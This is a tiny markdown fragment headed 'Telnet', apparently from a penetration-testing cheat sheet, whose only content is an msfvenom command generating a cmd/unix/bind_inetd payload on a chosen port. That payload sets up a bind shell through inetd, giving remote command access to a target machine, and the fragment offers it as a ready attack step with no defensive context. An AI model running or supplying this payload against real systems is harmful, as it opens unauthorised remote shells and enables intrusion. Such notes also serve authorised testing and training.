# Telnet

## 01 - Generate a payload via `msfvenom`

```
$ msfvenom -p cmd/unix/bind_inetd lport=<PORT>
```